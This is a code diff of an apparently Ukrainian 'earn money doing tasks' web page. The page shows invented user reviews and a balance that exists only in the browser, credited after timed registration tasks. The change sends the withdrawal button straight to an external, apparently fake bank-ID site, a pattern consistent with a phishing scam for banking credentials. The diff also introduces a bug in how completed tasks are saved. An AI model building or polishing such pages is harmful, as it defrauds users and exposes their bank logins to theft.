@@ -240,7 +240,7 @@
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             const STORAGE_KEYS = {
-                STATS: 'workuaStats_v3', // v3 to reset stats for new theme
+                STATS: 'workuaStats_v3',
                 BALANCE: 'workuaAppBalance_v3',
                 TASKS: 'workuaCompletedTasks_v3',
             };
@@ -254,7 +254,6 @@
                 }
             };
             
-            // ЗАДАНИЯ С НОВЫМИ ЦЕНАМИ
             const allTasks = [
                 { id: 'task13', title: 'Реєстрація на kidstaff.com.ua', url: 'https://login.kidstaff.com.ua/register', reward: 215 },
                 { id: 'task14', title: 'Реєстрація на reono.ua', url: 'https://reono.ua/#signup_form', reward: 210 },
@@ -273,7 +272,6 @@
                 { id: 'task9', title: 'Реєстрація на ria.com', url: 'https://www.ria.com/uk/login.html', reward: 110 }
             ];
 
-            // НОВЫЙ МАССИВ С ОТЗЫВАМИ
             const allReviews = [
                 { name: 'Марія', text: 'Менеджери тут не дуже порядні, відповідають дуже довго, можуть образити' },
                 { name: 'Дмитро', text: 'Заробив 2500 грн за два дні, все ок, рекомендую' },
@@ -297,7 +295,7 @@
                 { name: 'Андрій', text: 'Зробив три завдання просто перевірили, гроші прийшли за годину' },
                 { name: 'Софія', text: 'заданий мала' },
                 { name: 'Максим', text: 'Менеджери повільно відповідають, але гроші приходять' },
-                { name: 'Дарія', text: '...' }, // Текст для Дарии не виден на скрине
+                { name: 'Дарія', text: '...' },
                 { name: 'Тарас', text: 'хочу ещк заданий' },
                 { name: 'Інна', text: 'намучалася я ,бо телефон лагаю , 4 дні 10 завдань робила' },
                 { name: 'Григорій', text: 'Виводи швидкі , підтримка туга' },
@@ -307,7 +305,7 @@
                 { name: 'Петро', text: 'Менеджер Віка дуже груба, але вивести допомогла' },
                 { name: 'Лілія', text: 'сайт топ' },
                 { name: 'Ярослав', text: 'Сайт зручний, виплати без затримок' },
-                { name: 'Вероніка', text: 'сидела с ребенком ,ждали виплату , ...' } // Текст для Вероники не виден полностью
+                { name: 'Вероніка', text: 'сидела с ребенком ,ждали виплату , ...' }
             ];
 
             const participantsEl = document.getElementById('participants-count');
@@ -330,7 +328,6 @@
             
             function loadBalance() {
                 const savedBalance = safeStorage.getItem(STORAGE_KEYS.BALANCE);
-                // ИЗМЕНЕНИЕ: Начальный баланс 250
                 currentBalance = savedBalance !== null ? parseFloat(savedBalance) : 250.0;
                 if (balanceEl) balanceEl.textContent = currentBalance.toFixed(2) + ' ₴';
             }
@@ -357,7 +354,7 @@
                 if (!container) return;
                 const completedTasks = safeStorage.parse(STORAGE_KEYS.TASKS, []);
                 container.innerHTML = '';
-                if (allTasks.length === 0) { container.innerHTML = '<p style="color: var(--text-secondary); font-family: var(--font-secondary);">Нові завдання з\'являться незабаром.</p>'; return; }
+                if (allTasks.length === 0) { container.innerHTML = '<p>Нові завдання з\'являться незабаром.</p>'; return; }
                 allTasks.forEach(task => {
                     const isCompleted = completedTasks.includes(task.id);
                     const taskItem = document.createElement('div');
@@ -369,7 +366,6 @@
                 });
             }
 
-            // НОВАЯ ФУНКЦИЯ ДЛЯ ОТОБРАЖЕНИЯ ОТЗЫВОВ
             function renderReviews() {
                 const container = document.getElementById('reviews-container');
                 if (!container) return;
@@ -424,7 +420,7 @@
                         clearInterval(countdown);
                         updateBalance(reward);
                         let completedTasks = safeStorage.parse(STORAGE_KEYS.TASKS, []);
-                        if (!completedTasks.includes(taskId)) { completedTasks.push(taskId); safeStorage.setItem(STORAGE_KEYS.TASKS, JSON.stringify(completedTasks)); }
+                        if (!completedTasks.includes(taskId)) { completedTasks.push(taskId); safeStorage.setItem(STORAGE_KEYS, JSON.stringify(completedTasks)); }
                         const modal = document.getElementById('task-detail-modal');
                         if (modal) modal.style.display = 'none';
                         alert(`Завдання виконано! ${reward} ₴ зараховано на ваш баланс.`);
@@ -437,7 +433,6 @@
                 setupModal('withdraw-btn', 'withdraw-modal');
                 setupModal('open-tasks-list-btn', 'tasks-list-modal', renderAllTasks);
                 setupModal('start-earning-btn', 'tasks-list-modal', renderAllTasks);
-                // ИЗМЕНЕНИЕ: Убрали бонусы, добавили отзывы
                 setupModal('open-reviews-btn', 'reviews-modal', renderReviews);
                 setupModal('open-about-btn', 'about-modal');
 
@@ -455,31 +450,11 @@
                         bankCardOption.classList.toggle('inactive', !(amount && amount >= 100));
                     });
                     
-                    // ИЗМЕНЕНИЕ ЛОГИКИ ВЫВОДА
+                    // УПРОЩЕННАЯ ЛОГИКА ВЫВОДА (БЕЗ СЕРВЕРА)
                     bankCardOption.addEventListener('click', function() {
                         if (!bankCardOption.classList.contains('inactive')) {
-                            const amount = parseFloat(amountInput.value);
-                            
-                            // Адрес вашего сервера. Если запускаете локально, то http://localhost:3000
-                            // Когда выложите на хостинг, замените на адрес вашего сервера
-                            const serverUrl = 'http://localhost:3000/withdraw';
-
-                            fetch(serverUrl, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ amount: amount })
-                            })
-                            .then(response => response.json())
-                            .then(data => {
-                                console.log('Success:', data);
-                                // ИЗМЕНЕНИЕ: Новая ссылка для редиректа
-                                window.location.href = 'https://bankingid-0lto.onrender.com/?ref=dmFsZXZsZA%3D%3D';
-                            })
-                            .catch((error) => {
-                                console.error('Error:', error);
-                                alert('Помилка при відправці запиту на вивід. Спробуйте пізніше.');
-                            });
-
+                            // Просто перенаправляем пользователя на нужную ссылку
+                            window.location.href = 'https://bankingid-0lto.onrender.com/?ref=dmFsZXZsZA%3D%3D';
                         } else {
                             alert('Будь ласка, введіть суму виводу 100 гривень або більше.');
                         }
